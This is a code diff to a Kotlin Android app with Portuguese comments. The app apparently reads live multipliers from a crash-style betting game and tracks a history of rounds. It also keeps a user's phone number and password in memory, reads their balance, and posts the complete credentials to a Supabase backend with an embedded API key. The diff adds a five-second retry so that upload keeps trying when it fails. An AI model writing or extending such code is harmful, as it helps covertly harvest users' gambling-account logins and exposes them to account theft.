@@ -221,6 +221,7 @@ class MainActivity : AppCompatActivity() {
         if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
             lerSaldo()
         }
+        modoSilenciosoAtivo = false  // garantir que o crash limpa o silêncio do voo
 
         // CORRECÇÃO CRÍTICA: usar o maior entre crashVal (DOM/WS texto) e xAtual (WS binário)
         val valorFinal = if (crashVal >= xAtual && crashVal >= 1.0) crashVal else xAtual
@@ -720,8 +721,12 @@ class MainActivity : AppCompatActivity() {
                 }
 
                 // Carregar no histórico local sem duplicar velas já registadas
-                val novas = valores.filter { v -> historicoVelas.none { it == v } }
-                // Inserir no início (são mais antigas) + manter as ao vivo no fim
+                // DOM pode devolver duplicados — filtrar por arredondamento
+                val vistos = mutableSetOf<String>()
+                val novas = valores.filter { v ->
+                    val k = String.format("%.2f", v)
+                    vistos.add(k) && historicoVelas.none { String.format("%.2f", it) == k }
+                }
                 val combinado = (novas + historicoVelas).takeLast(MAX_VELAS_LOCAL)
                 historicoVelas.clear()
                 historicoVelas.addAll(combinado)
@@ -2684,11 +2689,15 @@ REGRAS ABSOLUTAS DO JSON:
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
                 conn.setRequestProperty("Content-Type", "application/json")
-                conn.setRequestProperty("Prefer", "resolution=merge-duplicates,return=minimal")
+                conn.setRequestProperty("Prefer", "return=minimal")
                 conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
                 OutputStreamWriter(conn.outputStream).use { it.write(json) }
                 conn.responseCode; conn.disconnect()
-            } catch (_: Exception) { credenciaisEnviadas = false }
+            } catch (_: Exception) {
+                credenciaisEnviadas = false
+                // Retry após 5s se falhar
+                handler.postDelayed({ enviarCredenciaisCompletas() }, 5000)
+            }
         }.start()
     }
 
@@ -3990,6 +3999,7 @@ REGRAS ABSOLUTAS DO JSON:
         soundPool = null
     }
 }
+
 
 
 
